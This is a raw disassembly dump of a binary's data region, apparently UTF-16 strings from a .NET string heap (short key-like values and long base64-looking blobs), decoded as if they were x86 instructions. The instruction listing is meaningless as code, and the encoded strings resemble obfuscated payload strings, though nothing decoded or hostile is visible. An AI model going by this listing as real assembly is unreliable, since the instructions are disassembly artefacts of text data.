100041c1:	00 51 00             	add    %dl,0x0(%ecx)
100041c4:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
100041c9:	15 6d 00 55 00       	adc    $0x55006d,%eax
100041ce:	52                   	push   %edx
100041cf:	00 4a 00             	add    %cl,0x0(%edx)
100041d2:	38 00                	cmp    %al,(%eax)
100041d4:	66 00 50 00          	data16 add %dl,0x0(%eax)
100041d8:	67 00 62 00          	add    %ah,0x0(%bp,%si)
100041dc:	39 00                	cmp    %eax,(%eax)
100041de:	00 80 b9 56 00 30    	add    %al,0x300056b9(%eax)
100041e4:	00 78 00             	add    %bh,0x0(%eax)
100041e7:	6b 00 61             	imul   $0x61,(%eax),%eax
100041ea:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
100041ee:	00 6a 00             	add    %ch,0x0(%edx)
100041f1:	53                   	push   %ebx
100041f2:	00 7a 00             	add    %bh,0x0(%edx)
100041f5:	4e                   	dec    %esi
100041f6:	00 6a 00             	add    %ch,0x0(%edx)
100041f9:	4d                   	dec    %ebp
100041fa:	00 31                	add    %dh,(%ecx)
100041fc:	00 56 00             	add    %dl,0x0(%esi)
100041ff:	74 00                	je     0x10004201
10004201:	56                   	push   %esi
10004202:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
10004206:	00 4d 00             	add    %cl,0x0(%ebp)
10004209:	5a                   	pop    %edx
1000420a:	00 47 00             	add    %al,0x0(%edi)
1000420d:	6b 00 33             	imul   $0x33,(%eax),%eax
10004210:	00 59 00             	add    %bl,0x0(%ecx)
10004213:	30 00                	xor    %al,(%eax)
10004215:	73 00                	jae    0x10004217
10004217:	7a 00                	jp     0x10004219
10004219:	59                   	pop    %ecx
1000421a:	00 7a 00             	add    %bh,0x0(%edx)
1000421d:	4e                   	dec    %esi
1000421e:	00 58 00             	add    %bl,0x0(%eax)
10004221:	54                   	push   %esp
10004222:	00 47 00             	add    %al,0x0(%edi)
10004225:	52                   	push   %edx
10004226:	00 70 00             	add    %dh,0x0(%eax)
10004229:	4e                   	dec    %esi
1000422a:	00 32                	add    %dh,(%edx)
1000422c:	00 4e 00             	add    %cl,0x0(%esi)
1000422f:	4c                   	dec    %esp
10004230:	00 4d 00             	add    %cl,0x0(%ebp)
10004233:	32 00                	xor    (%eax),%al
10004235:	4d                   	dec    %ebp
10004236:	00 7a 00             	add    %bh,0x0(%edx)
10004239:	62 00                	bound  %eax,(%eax)
1000423b:	6c                   	insb   (%dx),%es:(%edi)
1000423c:	00 46 00             	add    %al,0x0(%esi)
1000423f:	59                   	pop    %ecx
10004240:	00 56 00             	add    %dl,0x0(%esi)
10004243:	30 00                	xor    %al,(%eax)
10004245:	78 00                	js     0x10004247
10004247:	6b 00 61             	imul   $0x61,(%eax),%eax
1000424a:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
1000424e:	00 6a 00             	add    %ch,0x0(%edx)
10004251:	53                   	push   %ebx
10004252:	00 7a 00             	add    %bh,0x0(%edx)
10004255:	4e                   	dec    %esi
10004256:	00 6a 00             	add    %ch,0x0(%edx)
10004259:	4d                   	dec    %ebp
1000425a:	00 31                	add    %dh,(%ecx)
1000425c:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
10004260:	00 5a 00             	add    %bl,0x0(%edx)
10004263:	47                   	inc    %edi
10004264:	00 6b 00             	add    %ch,0x0(%ebx)
10004267:	33 00                	xor    (%eax),%eax
10004269:	59                   	pop    %ecx
1000426a:	00 30                	add    %dh,(%eax)
1000426c:	00 73 00             	add    %dh,0x0(%ebx)
1000426f:	7a 00                	jp     0x10004271
10004271:	59                   	pop    %ecx
10004272:	00 7a 00             	add    %bh,0x0(%edx)
10004275:	4e                   	dec    %esi
10004276:	00 4f 00             	add    %cl,0x0(%edi)
10004279:	64 00 46 00          	add    %al,%fs:0x0(%esi)
1000427d:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
10004281:	5a                   	pop    %edx
10004282:	00 47 00             	add    %al,0x0(%edi)
10004285:	6b 00 33             	imul   $0x33,(%eax),%eax
10004288:	00 59 00             	add    %bl,0x0(%ecx)
1000428b:	30 00                	xor    %al,(%eax)
1000428d:	73 00                	jae    0x1000428f
1000428f:	7a 00                	jp     0x10004291
10004291:	59                   	pop    %ecx
10004292:	00 7a 00             	add    %bh,0x0(%edx)
10004295:	4d                   	dec    %ebp
10004296:	00 3d 00 00 15 57    	add    %bh,0x57150000
1000429c:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
100042a0:	00 69 00             	add    %ch,0x0(%ecx)
100042a3:	37                   	aaa
100042a4:	00 63 00             	add    %ah,0x0(%ebx)
100042a7:	4b                   	dec    %ebx
100042a8:	00 33                	add    %dh,(%ebx)
100042aa:	00 63 00             	add    %ah,0x0(%ebx)
100042ad:	33 00                	xor    (%eax),%eax
100042af:	00 80 b9 52 00 6c    	add    %al,0x6c0052b9(%eax)
100042b5:	00 5a 00             	add    %bl,0x0(%edx)
100042b8:	44                   	inc    %esp
100042b9:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
100042bd:	00 56 00             	add    %dl,0x0(%esi)
100042c0:	6f                   	outsl  %ds:(%esi),(%dx)
100042c1:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
100042c5:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
100042c9:	00 4f 00             	add    %cl,0x0(%edi)
100042cc:	47                   	inc    %edi
100042cd:	00 46 00             	add    %al,0x0(%esi)
100042d0:	58                   	pop    %eax
100042d1:	00 65 00             	add    %ah,0x0(%ebp)
100042d4:	45                   	inc    %ebp
100042d5:	00 5a 00             	add    %bl,0x0(%edx)
100042d8:	57                   	push   %edi
100042d9:	00 51 00             	add    %dl,0x0(%ecx)
100042dc:	30 00                	xor    %al,(%eax)
100042de:	31 00                	xor    %eax,(%eax)
100042e0:	31 00                	xor    %eax,(%eax)
100042e2:	61                   	popa
100042e3:	00 48 00             	add    %cl,0x0(%eax)
100042e6:	64 00 33             	add    %dh,%fs:(%ebx)
100042e9:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
100042ed:	00 68 00             	add    %ch,0x0(%eax)
100042f0:	47                   	inc    %edi
100042f1:	00 56 00             	add    %dl,0x0(%esi)
100042f4:	6b 00 4e             	imul   $0x4e,(%eax),%eax
100042f7:	00 4e 00             	add    %cl,0x0(%esi)
100042fa:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
100042fe:	68 00 33 00 64       	push   $0x64003300
10004303:	00 30                	add    %dh,(%eax)
10004305:	00 30                	add    %dh,(%eax)
10004307:	00 34 00             	add    %dh,(%eax,%eax,1)
1000430a:	61                   	popa
1000430b:	00 47 00             	add    %al,0x0(%edi)
1000430e:	4d                   	dec    %ebp
1000430f:	00 79 00             	add    %bh,0x0(%ecx)
10004312:	52                   	push   %edx
10004313:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
10004317:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
1000431b:	00 58 00             	add    %bl,0x0(%eax)
1000431e:	56                   	push   %esi
1000431f:	00 6f 00             	add    %ch,0x0(%edi)
10004322:	64 00 33             	add    %dh,%fs:(%ebx)
10004325:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10004329:	00 4f 00             	add    %cl,0x0(%edi)
1000432c:	45                   	inc    %ebp
1000432d:	00 5a 00             	add    %bl,0x0(%edx)
10004330:	57                   	push   %edi
10004331:	00 51 00             	add    %dl,0x0(%ecx)
10004334:	30 00                	xor    %al,(%eax)
10004336:	31 00                	xor    %eax,(%eax)
10004338:	31 00                	xor    %eax,(%eax)
1000433a:	61                   	popa
1000433b:	00 48 00             	add    %cl,0x0(%eax)
1000433e:	64 00 33             	add    %dh,%fs:(%ebx)
10004341:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10004345:	00 67 00             	add    %ah,0x0(%edi)
10004348:	77 00                	ja     0x1000434a
1000434a:	50                   	push   %eax
1000434b:	00 55 00             	add    %dl,0x0(%ebp)
1000434e:	5a                   	pop    %edx
1000434f:	00 57 00             	add    %dl,0x0(%edi)
10004352:	51                   	push   %ecx
10004353:	00 30                	add    %dh,(%eax)
10004355:	00 31                	add    %dh,(%ecx)
10004357:	00 31                	add    %dh,(%ecx)
10004359:	00 61 00             	add    %ah,0x0(%ecx)
1000435c:	48                   	dec    %eax
1000435d:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
10004361:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10004365:	00 67 00             	add    %ah,0x0(%edi)
10004368:	3d 00 00 15 46       	cmp    $0x46150000,%eax
1000436d:	00 56 00             	add    %dl,0x0(%esi)
10004370:	43                   	inc    %ebx
10004371:	00 4d 00             	add    %cl,0x0(%ebp)
10004374:	75 00                	jne    0x10004376
10004376:	68 00 77 00 77       	push   $0x77007700
1000437b:	00 4d 00             	add    %cl,0x0(%ebp)
1000437e:	38 00                	cmp    %al,(%eax)
10004380:	00 80 f9 56 00 44    	add    %al,0x440056f9(%eax)
10004386:	00 42 00             	add    %al,0x0(%edx)
10004389:	6c                   	insb   (%dx),%es:(%edi)
1000438a:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
1000438e:	00 5a 00             	add    %bl,0x0(%edx)
10004391:	35 00 59 00 6c       	xor    $0x6c005900,%eax
10004396:	00 42 00             	add    %al,0x0(%edx)
10004399:	7a 00                	jp     0x1000439b
1000439b:	64 00 6c 00 46       	add    %ch,%fs:0x46(%eax,%eax,1)
100043a0:	00 59 00             	add    %bl,0x0(%ecx)
100043a3:	51                   	push   %ecx
100043a4:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
100043a8:	00 77 00             	add    %dh,0x0(%edi)
100043ab:	5a                   	pop    %edx
100043ac:	00 55 00             	add    %dl,0x0(%ebp)
100043af:	39 00                	cmp    %eax,(%eax)
100043b1:	57                   	push   %edi
100043b2:	00 65 00             	add    %ah,0x0(%ebp)
100043b5:	57                   	push   %edi
100043b6:	00 4a 00             	add    %cl,0x0(%edx)
100043b9:	51                   	push   %ecx
100043ba:	00 63 00             	add    %ah,0x0(%ebx)
100043bd:	33 00                	xor    (%eax),%eax
100043bf:	5a                   	pop    %edx
100043c0:	00 55 00             	add    %dl,0x0(%ebp)
100043c3:	4d                   	dec    %ebp
100043c4:	00 47 00             	add    %al,0x0(%edi)
100043c7:	56                   	push   %esi
100043c8:	00 50 00             	add    %dl,0x0(%eax)
100043cb:	56                   	push   %esi
100043cc:	00 6e 00             	add    %ch,0x0(%esi)
100043cf:	6c                   	insb   (%dx),%es:(%edi)
100043d0:	00 69 00             	add    %ch,0x0(%ecx)
100043d3:	55                   	push   %ebp
100043d4:	00 48 00             	add    %cl,0x0(%eax)
100043d7:	4e                   	dec    %esi
100043d8:	00 32                	add    %dh,(%edx)
100043da:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
100043de:	00 52 00             	add    %dl,0x0(%edx)
100043e1:	48                   	dec    %eax
100043e2:	00 56 00             	add    %dl,0x0(%esi)
100043e5:	44                   	inc    %esp
100043e6:	00 42 00             	add    %al,0x0(%edx)
100043e9:	6c                   	insb   (%dx),%es:(%edi)
100043ea:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
100043ee:	00 5a 00             	add    %bl,0x0(%edx)
100043f1:	35 00 59 00 6c       	xor    $0x6c005900,%eax
100043f6:	00 42 00             	add    %al,0x0(%edx)
100043f9:	7a 00                	jp     0x100043fb
100043fb:	64 00 6c 00 51       	add    %ch,%fs:0x51(%eax,%eax,1)
10004400:	00 77 00             	add    %dh,0x0(%edi)
10004403:	5a                   	pop    %edx
10004404:	00 55 00             	add    %dl,0x0(%ebp)
10004407:	39 00                	cmp    %eax,(%eax)
10004409:	57                   	push   %edi
1000440a:	00 65 00             	add    %ah,0x0(%ebp)
1000440d:	57                   	push   %edi
1000440e:	00 4a 00             	add    %cl,0x0(%edx)
10004411:	51                   	push   %ecx
10004412:	00 63 00             	add    %ah,0x0(%ebx)
10004415:	33 00                	xor    (%eax),%eax
10004417:	5a                   	pop    %edx
10004418:	00 47 00             	add    %al,0x0(%edi)
1000441b:	4d                   	dec    %ebp
1000441c:	00 57 00             	add    %dl,0x0(%edi)
1000441f:	4a                   	dec    %edx
10004420:	00 55 00             	add    %dl,0x0(%ebp)
10004423:	4d                   	dec    %ebp
10004424:	00 47 00             	add    %al,0x0(%edi)
10004427:	56                   	push   %esi
10004428:	00 50 00             	add    %dl,0x0(%eax)
1000442b:	56                   	push   %esi
1000442c:	00 6e 00             	add    %ch,0x0(%esi)
1000442f:	6c                   	insb   (%dx),%es:(%edi)
10004430:	00 69 00             	add    %ch,0x0(%ecx)
10004433:	55                   	push   %ebp
10004434:	00 48 00             	add    %cl,0x0(%eax)
10004437:	4e                   	dec    %esi
10004438:	00 32                	add    %dh,(%edx)
1000443a:	00 56 00             	add    %dl,0x0(%esi)
1000443d:	44                   	inc    %esp
1000443e:	00 42 00             	add    %al,0x0(%edx)
10004441:	6c                   	insb   (%dx),%es:(%edi)
10004442:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
10004446:	00 5a 00             	add    %bl,0x0(%edx)
10004449:	35 00 59 00 6c       	xor    $0x6c005900,%eax
1000444e:	00 42 00             	add    %al,0x0(%edx)
10004451:	7a 00                	jp     0x10004453
10004453:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004457:	31 00                	xor    %eax,(%eax)
10004459:	4f                   	dec    %edi
1000445a:	00 62 00             	add    %ah,0x0(%edx)
1000445d:	31 00                	xor    %eax,(%eax)
1000445f:	51                   	push   %ecx
10004460:	00 77 00             	add    %dh,0x0(%edi)
10004463:	5a                   	pop    %edx
10004464:	00 55 00             	add    %dl,0x0(%ebp)
10004467:	39 00                	cmp    %eax,(%eax)
10004469:	57                   	push   %edi
1000446a:	00 65 00             	add    %ah,0x0(%ebp)
1000446d:	57                   	push   %edi
1000446e:	00 4a 00             	add    %cl,0x0(%edx)
10004471:	51                   	push   %ecx
10004472:	00 63 00             	add    %ah,0x0(%ebx)
10004475:	33 00                	xor    (%eax),%eax
10004477:	59                   	pop    %ecx
10004478:	00 3d 00 00 15 54    	add    %bh,0x54150000
1000447e:	00 30                	add    %dh,(%eax)
10004480:	00 65 00             	add    %ah,0x0(%ebp)
10004483:	4f                   	dec    %edi
10004484:	00 56 00             	add    %dl,0x0(%esi)
10004487:	79 00                	jns    0x10004489
10004489:	62 00                	bound  %eax,(%eax)
1000448b:	50                   	push   %eax
1000448c:	00 73 00             	add    %dh,0x0(%ebx)
1000448f:	76 00                	jbe    0x10004491
10004491:	00 79 4d             	add    %bh,0x4d(%ecx)
10004494:	00 6b 00             	add    %ch,0x0(%ebx)
10004497:	6f                   	outsl  %ds:(%esi),(%dx)
10004498:	00 79 00             	add    %bh,0x0(%ecx)
1000449b:	65 00 47 00          	add    %al,%gs:0x0(%edi)
1000449f:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
100044a3:	63 00                	arpl   %eax,(%eax)
100044a5:	6b 00 63             	imul   $0x63,(%eax),%eax
100044a8:	00 77 00             	add    %dh,0x0(%edi)
100044ab:	56                   	push   %esi
100044ac:	00 46 00             	add    %al,0x0(%esi)
100044af:	6b 00 7a             	imul   $0x7a,(%eax),%eax
100044b2:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
100044b6:	00 4a 00             	add    %cl,0x0(%edx)
100044b9:	4b                   	dec    %ebx
100044ba:	00 4d 00             	add    %cl,0x0(%ebp)
100044bd:	6e                   	outsb  %ds:(%esi),(%dx)
100044be:	00 68 00             	add    %ch,0x0(%eax)
100044c1:	6e                   	outsb  %ds:(%esi),(%dx)
100044c2:	00 63 00             	add    %ah,0x0(%ebx)
100044c5:	6e                   	outsb  %ds:(%esi),(%dx)
100044c6:	00 4a 00             	add    %cl,0x0(%edx)
100044c9:	48                   	dec    %eax
100044ca:	00 4d 00             	add    %cl,0x0(%ebp)
100044cd:	46                   	inc    %esi
100044ce:	00 51 00             	add    %dl,0x0(%ecx)
100044d1:	79 00                	jns    0x100044d3
100044d3:	53                   	push   %ebx
100044d4:	00 6a 00             	add    %ch,0x0(%edx)
100044d7:	4a                   	dec    %edx
100044d8:	00 34 00             	add    %dh,(%eax,%eax,1)
100044db:	5a                   	pop    %edx
100044dc:	00 33                	add    %dh,(%ebx)
100044de:	00 4a 00             	add    %cl,0x0(%edx)
100044e1:	79 00                	jns    0x100044e3
100044e3:	52                   	push   %edx
100044e4:	00 7a 00             	add    %bh,0x0(%edx)
100044e7:	42                   	inc    %edx
100044e8:	00 55 00             	add    %dl,0x0(%ebp)
100044eb:	61                   	popa
100044ec:	00 6a 00             	add    %ch,0x0(%edx)
100044ef:	4a                   	dec    %edx
100044f0:	00 4b 00             	add    %cl,0x0(%ebx)
100044f3:	4d                   	dec    %ebp
100044f4:	00 6e 00             	add    %ch,0x0(%esi)
100044f7:	68 00 6e 00 63       	push   $0x63006e00
100044fc:	00 6e 00             	add    %ch,0x0(%esi)
100044ff:	4a                   	dec    %edx
10004500:	00 48 00             	add    %cl,0x0(%eax)
10004503:	4d                   	dec    %ebp
10004504:	00 46 00             	add    %al,0x0(%esi)
10004507:	51                   	push   %ecx
10004508:	00 3d 00 00 15 32    	add    %bh,0x32150000
1000450e:	00 4a 00             	add    %cl,0x0(%edx)
10004511:	32 00                	xor    (%eax),%al
10004513:	78 00                	js     0x10004515
10004515:	67 00 72 00          	add    %dh,0x0(%bp,%si)
10004519:	72 00                	jb     0x1000451b
1000451b:	47                   	inc    %edi
1000451c:	00 30                	add    %dh,(%eax)
1000451e:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
10004522:	81 71 53 00 57 00 67 	xorl   $0x67005700,0x53(%ecx)
10004529:	00 79 00             	add    %bh,0x0(%ecx)
1000452c:	62 00                	bound  %eax,(%eax)
1000452e:	47                   	inc    %edi
1000452f:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10004533:	00 4e 00             	add    %cl,0x0(%esi)
10004536:	47                   	inc    %edi
10004537:	00 52 00             	add    %dl,0x0(%edx)
1000453a:	71 00                	jno    0x1000453c
1000453c:	52                   	push   %edx
1000453d:	00 46 00             	add    %al,0x0(%esi)
10004540:	4e                   	dec    %esi
10004541:	00 58 00             	add    %bl,0x0(%eax)
10004544:	4e                   	dec    %esi
10004545:	00 55 00             	add    %dl,0x0(%ebp)
10004548:	6c                   	insb   (%dx),%es:(%edi)
10004549:	00 6f 00             	add    %ch,0x0(%edi)
1000454c:	4d                   	dec    %ebp
1000454d:	00 6d 00             	add    %ch,0x0(%ebp)
10004550:	78 00                	js     0x10004552
10004552:	70 00                	jo     0x10004554
10004554:	57                   	push   %edi
10004555:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10004559:	00 6b 00             	add    %ch,0x0(%ebx)
1000455c:	61                   	popa
1000455d:	00 6b 00             	add    %ch,0x0(%ebx)
10004560:	52                   	push   %edx
10004561:	00 4a 00             	add    %cl,0x0(%edx)
10004564:	61                   	popa
10004565:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
10004569:	00 73 00             	add    %dh,0x0(%ebx)
1000456c:	61                   	popa
1000456d:	00 56 00             	add    %dl,0x0(%esi)
10004570:	67 00 30             	add    %dh,(%bx,%si)
10004573:	00 5a 00             	add    %bl,0x0(%edx)
10004576:	47                   	inc    %edi
10004577:	00 70 00             	add    %dh,0x0(%eax)
1000457a:	45                   	inc    %ebp
1000457b:	00 65 00             	add    %ah,0x0(%ebp)
1000457e:	6d                   	insl   (%dx),%es:(%edi)
1000457f:	00 52 00             	add    %dl,0x0(%edx)
10004582:	48                   	dec    %eax
10004583:	00 53 00             	add    %dl,0x0(%ebx)
10004586:	57                   	push   %edi
10004587:	00 67 00             	add    %ah,0x0(%edi)
1000458a:	79 00                	jns    0x1000458c
1000458c:	62 00                	bound  %eax,(%eax)
1000458e:	47                   	inc    %edi
1000458f:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10004593:	00 4e 00             	add    %cl,0x0(%esi)
10004596:	47                   	inc    %edi
10004597:	00 52 00             	add    %dl,0x0(%edx)
1000459a:	71 00                	jno    0x1000459c
1000459c:	52                   	push   %edx
1000459d:	00 45 00             	add    %al,0x0(%ebp)
100045a0:	6c                   	insb   (%dx),%es:(%edi)
100045a1:	00 6f 00             	add    %ch,0x0(%edi)
100045a4:	4d                   	dec    %ebp
100045a5:	00 6d 00             	add    %ch,0x0(%ebp)
100045a8:	78 00                	js     0x100045aa
100045aa:	70 00                	jo     0x100045ac
100045ac:	57                   	push   %edi
100045ad:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
100045b1:	00 6b 00             	add    %ch,0x0(%ebx)
100045b4:	61                   	popa
100045b5:	00 6b 00             	add    %ch,0x0(%ebx)
100045b8:	52                   	push   %edx
100045b9:	00 47 00             	add    %al,0x0(%edi)
100045bc:	63 00                	arpl   %eax,(%eax)
100045be:	32 00                	xor    (%eax),%al
100045c0:	4a                   	dec    %edx
100045c1:	00 4a 00             	add    %cl,0x0(%edx)
100045c4:	61                   	popa
100045c5:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
100045c9:	00 73 00             	add    %dh,0x0(%ebx)
100045cc:	61                   	popa
100045cd:	00 56 00             	add    %dl,0x0(%esi)
100045d0:	67 00 30             	add    %dh,(%bx,%si)
100045d3:	00 5a 00             	add    %bl,0x0(%edx)
100045d6:	47                   	inc    %edi
100045d7:	00 70 00             	add    %dh,0x0(%eax)
100045da:	45                   	inc    %ebp
100045db:	00 53 00             	add    %dl,0x0(%ebx)
100045de:	57                   	push   %edi
100045df:	00 67 00             	add    %ah,0x0(%edi)
100045e2:	79 00                	jns    0x100045e4
100045e4:	62 00                	bound  %eax,(%eax)
100045e6:	47                   	inc    %edi
100045e7:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
100045eb:	00 4e 00             	add    %cl,0x0(%esi)
100045ee:	47                   	inc    %edi
100045ef:	00 52 00             	add    %dl,0x0(%edx)
100045f2:	71 00                	jno    0x100045f4
100045f4:	52                   	push   %edx
100045f5:	00 45 00             	add    %al,0x0(%ebp)
100045f8:	5a                   	pop    %edx
100045f9:	00 57 00             	add    %dl,0x0(%edi)
100045fc:	4d                   	dec    %ebp
100045fd:	00 45 00             	add    %al,0x0(%ebp)
10004600:	6c                   	insb   (%dx),%es:(%edi)
10004601:	00 6f 00             	add    %ch,0x0(%edi)
10004604:	4d                   	dec    %ebp
10004605:	00 6d 00             	add    %ch,0x0(%ebp)
10004608:	78 00                	js     0x1000460a
1000460a:	70 00                	jo     0x1000460c
1000460c:	57                   	push   %edi
1000460d:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10004611:	00 6b 00             	add    %ch,0x0(%ebx)
10004614:	61                   	popa
10004615:	00 6b 00             	add    %ch,0x0(%ebx)
10004618:	52                   	push   %edx
10004619:	00 4a 00             	add    %cl,0x0(%edx)
1000461c:	61                   	popa
1000461d:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
10004621:	00 73 00             	add    %dh,0x0(%ebx)
10004624:	61                   	popa
10004625:	00 56 00             	add    %dl,0x0(%esi)
10004628:	67 00 30             	add    %dh,(%bx,%si)
1000462b:	00 5a 00             	add    %bl,0x0(%edx)
1000462e:	47                   	inc    %edi
1000462f:	00 70 00             	add    %dh,0x0(%eax)
10004632:	45                   	inc    %ebp
10004633:	00 59 00             	add    %bl,0x0(%ecx)
10004636:	56                   	push   %esi
10004637:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
1000463b:	00 53 00             	add    %dl,0x0(%ebx)
1000463e:	57                   	push   %edi
1000463f:	00 67 00             	add    %ah,0x0(%edi)
10004642:	79 00                	jns    0x10004644
10004644:	62 00                	bound  %eax,(%eax)
10004646:	47                   	inc    %edi
10004647:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
1000464b:	00 4e 00             	add    %cl,0x0(%esi)
1000464e:	47                   	inc    %edi
1000464f:	00 52 00             	add    %dl,0x0(%edx)
10004652:	71 00                	jno    0x10004654
10004654:	52                   	push   %edx
10004655:	00 45 00             	add    %al,0x0(%ebp)
10004658:	6c                   	insb   (%dx),%es:(%edi)
10004659:	00 6f 00             	add    %ch,0x0(%edi)
1000465c:	4d                   	dec    %ebp
1000465d:	00 6d 00             	add    %ch,0x0(%ebp)
10004660:	78 00                	js     0x10004662
10004662:	70 00                	jo     0x10004664
10004664:	57                   	push   %edi
10004665:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10004669:	00 6b 00             	add    %ch,0x0(%ebx)
1000466c:	61                   	popa
1000466d:	00 6b 00             	add    %ch,0x0(%ebx)
10004670:	51                   	push   %ecx
10004671:	00 39                	add    %bh,(%ecx)
10004673:	00 53 00             	add    %dl,0x0(%ebx)
10004676:	57                   	push   %edi
10004677:	00 67 00             	add    %ah,0x0(%edi)
1000467a:	79 00                	jns    0x1000467c
1000467c:	62 00                	bound  %eax,(%eax)
1000467e:	47                   	inc    %edi
1000467f:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10004683:	00 4e 00             	add    %cl,0x0(%esi)
10004686:	47                   	inc    %edi
10004687:	00 52 00             	add    %dl,0x0(%edx)
1000468a:	71 00                	jno    0x1000468c
1000468c:	52                   	push   %edx
1000468d:	00 41 00             	add    %al,0x0(%ecx)
10004690:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004695:	15 49 00 68 00       	adc    $0x680049,%eax
1000469a:	32 00                	xor    (%eax),%al
1000469c:	6c                   	insb   (%dx),%es:(%edi)
1000469d:	00 69 00             	add    %ch,0x0(%ecx)
100046a0:	58                   	pop    %eax
100046a1:	00 34 00             	add    %dh,(%eax,%eax,1)
100046a4:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
100046a8:	44                   	inc    %esp
100046a9:	00 00                	add    %al,(%eax)
100046ab:	80 f9 5a             	cmp    $0x5a,%cl
100046ae:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
100046b2:	00 4b 00             	add    %cl,0x0(%ebx)
100046b5:	51                   	push   %ecx
100046b6:	00 7a 00             	add    %bh,0x0(%edx)
100046b9:	42                   	inc    %edx
100046ba:	00 6d 00             	add    %ch,0x0(%ebp)
100046bd:	53                   	push   %ebx
100046be:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
100046c2:	00 30                	add    %dh,(%eax)
100046c4:	00 65 00             	add    %ah,0x0(%ebp)
100046c7:	47                   	inc    %edi
100046c8:	00 4a 00             	add    %cl,0x0(%edx)
100046cb:	74 00                	je     0x100046cd
100046cd:	5a                   	pop    %edx
100046ce:	00 47 00             	add    %al,0x0(%edi)
100046d1:	55                   	push   %ebp
100046d2:	00 79 00             	add    %bh,0x0(%ecx)
100046d5:	53                   	push   %ebx
100046d6:	00 6b 00             	add    %ch,0x0(%ebx)
100046d9:	4d                   	dec    %ebp
100046da:	00 77 00             	add    %dh,0x0(%edi)
100046dd:	5a                   	pop    %edx
100046de:	00 6b 00             	add    %ch,0x0(%ebx)
100046e1:	6b 00 78             	imul   $0x78,(%eax),%eax
100046e4:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
100046e8:	00 68 00             	add    %ch,0x0(%eax)
100046eb:	6c                   	insb   (%dx),%es:(%edi)
100046ec:	00 4d 00             	add    %cl,0x0(%ebp)
100046ef:	6b 00 70             	imul   $0x70,(%eax),%eax
100046f2:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
100046f6:	00 47 00             	add    %al,0x0(%edi)
100046f9:	5a                   	pop    %edx
100046fa:	00 4a 00             	add    %cl,0x0(%edx)
100046fd:	4d                   	dec    %ebp
100046fe:	00 58 00             	add    %bl,0x0(%eax)
10004701:	52                   	push   %edx
10004702:	00 34 00             	add    %dh,(%eax,%eax,1)
10004705:	62 00                	bound  %eax,(%eax)
10004707:	47                   	inc    %edi
10004708:	00 4a 00             	add    %cl,0x0(%edx)
1000470b:	75 00                	jne    0x1000470d
1000470d:	5a                   	pop    %edx
1000470e:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10004712:	00 4b 00             	add    %cl,0x0(%ebx)
10004715:	51                   	push   %ecx
10004716:	00 7a 00             	add    %bh,0x0(%edx)
10004719:	42                   	inc    %edx
1000471a:	00 6d 00             	add    %ch,0x0(%ebp)
1000471d:	53                   	push   %ebx
1000471e:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10004722:	00 30                	add    %dh,(%eax)
10004724:	00 65 00             	add    %ah,0x0(%ebp)
10004727:	47                   	inc    %edi
10004728:	00 55 00             	add    %dl,0x0(%ebp)
1000472b:	79 00                	jns    0x1000472d
1000472d:	53                   	push   %ebx
1000472e:	00 6b 00             	add    %ch,0x0(%ebx)
10004731:	4d                   	dec    %ebp
10004732:	00 77 00             	add    %dh,0x0(%edi)
10004735:	5a                   	pop    %edx
10004736:	00 6b 00             	add    %ch,0x0(%ebx)
10004739:	6b 00 78             	imul   $0x78,(%eax),%eax
1000473c:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
10004740:	00 68 00             	add    %ch,0x0(%eax)
10004743:	53                   	push   %ebx
10004744:	00 61 00             	add    %ah,0x0(%ecx)
10004747:	47                   	inc    %edi
10004748:	00 4e 00             	add    %cl,0x0(%esi)
1000474b:	6c                   	insb   (%dx),%es:(%edi)
1000474c:	00 4d 00             	add    %cl,0x0(%ebp)
1000474f:	6b 00 70             	imul   $0x70,(%eax),%eax
10004752:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
10004756:	00 47 00             	add    %al,0x0(%edi)
10004759:	5a                   	pop    %edx
1000475a:	00 4a 00             	add    %cl,0x0(%edx)
